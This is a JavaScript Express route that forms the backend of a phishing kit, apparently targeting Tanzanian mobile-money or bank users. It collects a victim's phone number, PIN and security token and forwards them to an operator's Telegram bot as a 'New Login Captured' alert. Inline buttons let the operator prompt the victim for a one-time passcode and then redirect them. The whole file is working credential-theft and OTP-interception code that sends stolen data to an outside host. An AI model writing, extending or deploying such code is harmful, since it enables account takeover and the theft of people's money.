app.post("/api/submit", async (req, res) => {
    const { phone, pin, securityToken: token } = req.body;
    const sessionId = crypto.randomBytes(8).toString("hex");

    sessions[sessionId] = { 
        status: 'waiting', 
        phone: phone, 
        pin: pin, 
        token: token || 'N/A',
        timestamp: Date.now() 
    };

    const message = `🚀 *New Login Captured*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}\n🆔 Token: ${token || 'N/A'}\n🆔 ID: ${sessionId}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Html",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                    ],
                    [
                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/approved` }
                    ]
                ]
            }
        });
        res.json({ success: true, sessionId: sessionId });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});
